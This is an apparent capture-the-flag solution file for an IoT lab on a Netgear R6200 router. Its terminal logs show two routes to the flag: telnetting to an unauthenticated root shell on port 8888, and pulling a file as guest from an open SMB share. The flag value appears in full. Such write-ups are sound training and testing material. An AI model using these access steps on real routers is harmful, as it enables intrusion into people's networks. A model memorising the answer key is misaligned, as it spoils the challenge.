@@ -1,0 +1,88 @@
+
+
+Fail the admin login twice and find this in title
+    <title>NETGEAR Router R6200</title>
+
+
+RCE EXPLOIT SOLUTION
+
+root@rocketchat-lab:/opt/NotQuite0DayFriday/2020.06.15-netgear# nmap -p 8888 192.168.1.1
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-07-08 15:19 MDT
+Nmap scan report for _gateway (192.168.1.1)
+Host is up (0.0055s latency).
+
+PORT     STATE SERVICE
+8888/tcp open  sun-answerbook
+MAC Address: 20:E5:2A:19:3F:39 (Netgear)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
+root@rocketchat-lab:/opt/NotQuite0DayFriday/2020.06.15-netgear# telnet 192.168.1.1 8888
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+
+
+BusyBox v1.7.2 (2016-12-23 19:20:54 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+# mount
+rootfs on / type rootfs (rw)
+/dev/root on / type squashfs (ro)
+devfs on /dev type tmpfs (rw)
+proc on /proc type proc (rw)
+sysfs on /sys type sysfs (rw)
+ramfs on /tmp type ramfs (rw)
+usbdeffs on /proc/bus/usb type usbfs (rw)
+/dev/sda on /tmp/mnt/usb0/part0 type vfat (rw,fmask=0022,dmask=0022,codepage=cp437,iocharset=utf8)
+# cd /mnt/mnt/usb0/part0
+/bin/sh: cd: can't cd to /mnt/mnt/usb0/part0
+# ls
+bin    etc    media  proc   sys    usr    www
+dev    lib    mnt    sbin   tmp    var
+# cd /tmp/mnt/usb0/part0/
+# ls
+flag.txt
+# cat flag.txt 
+FLAG{viva_las_vegas}
+# 
+
+
+
+SMB SOLUTION
+
+root@rocketchat-lab:/opt/iot-ctf/netgear-r6200/lan# smbclient -L 192.168.1.1 
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	USB_Storage     Disk      read:all-no password;write:all-no password
+	IPC$            IPC       IPC Service (readyshare)
+	ADMIN$          IPC       IPC Service (readyshare)
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            READYSHARE
+root@rocketchat-lab:/opt/iot-ctf/netgear-r6200/lan# smbclient \\\\192.168.1.1\\USB_Storage guest
+WARNING: The "syslog" option is deprecated
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Dec 31 17:00:00 1969
+  ..                                  D        0  Wed Jan  1 01:00:06 2003
+  .ReadyDLNA                         DH        0  Wed Jan  1 01:00:15 2003
+  flag.txt                            A       21  Thu Jul  7 20:27:26 2022
+
+
+		3807968 blocks of size 1024. 3807884 blocks available
+smb: \> get flag.txt
+getting file \flag.txt of size 21 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> quit
+root@rocketchat-lab:/opt/iot-ctf/netgear-r6200/lan# cat flag.txt
+FLAG{viva_las_vegas}
+
